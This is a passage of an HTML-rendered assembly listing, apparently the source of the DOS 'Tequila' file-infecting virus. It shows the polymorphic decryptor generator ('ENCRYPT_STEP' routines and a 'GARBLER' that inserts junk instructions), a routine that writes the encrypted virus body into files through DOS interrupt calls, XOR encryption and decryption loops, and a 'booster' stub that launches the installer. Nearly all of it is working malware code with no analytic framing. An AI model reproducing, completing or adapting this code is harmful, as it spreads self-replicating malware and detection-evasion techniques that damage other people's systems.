   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">ENCRYPT_STEP_ONE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">08EB</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0E</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">01F</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0CB8C</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0DB8E</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">ENCRYPT_STEP_TWO</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">0FE</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0920</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0BE</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0960</span><span class="sc0">
   </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0934</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0BB</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0960</span><span class="sc0">
   </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">090C</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0960</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0B9</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0960</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">ENCRYPT_STEP_THREE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">014</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">017</span><span class="sc0">
   </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0958</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">XCHG</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">08A</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc2">0A39</span><span class="sc4">],</span><span class="sc2">028</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0978</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">030</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc2">0A39</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">04346</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FE81</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0BE</span><span class="sc0">
   </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0993</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0FB</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0BB</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">040</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">072</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0E2</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">GARBLER</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">GARBLER</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">0F</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0A0E</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">09F7</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">09F1</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0C789</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">090</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">085</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0A05</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
   </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0A1A</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">039</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">09F9</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0FC</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">MAKE_THE_DISK_WRITE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">PERFORM_ENCRYPTION_DECRYPTION</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">040</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">09A4</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09B4</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">0A37</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc2">0A39</span><span class="sc4">],</span><span class="sc2">028</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">0A44</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc2">0A39</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">PERFORM_ENCRYPTION_DECRYPTION</span><span class="sc0">
   </span><span class="sc6">POPF</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">PERFORM_ENCRYPTION_DECRYPTION</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0960</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0960</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">09A0</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">0A61</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0960</span><span class="sc0">
   </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc2">0A52</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">THE_FILE_DECRYPTING_ROUTINE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0964</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0960</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">09A4</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">0A7E</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0964</span><span class="sc0">
   </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc2">0A6F</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc2">0390</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc1">;========== THE FOLLOWING IS NOT PART OF THE VIRUS ========</span><span class="sc0">
</span><span class="sc1">;==========       BUT IS MERELY THE BOOSTER.       ========</span><span class="sc0">

</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0104</span><span class="sc4">],</span><span class="sc5">EXIT</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0106</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0106</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INSTALL</span><span class="sc0">

</span><span class="sc5">EXIT</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">020</span><span class="sc0">

</span><span class="sc5">TEQUILA</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc5">CODE_SEG</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">
</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">TEQUILA</span><span class="sc0"></span></div></body>
</html>
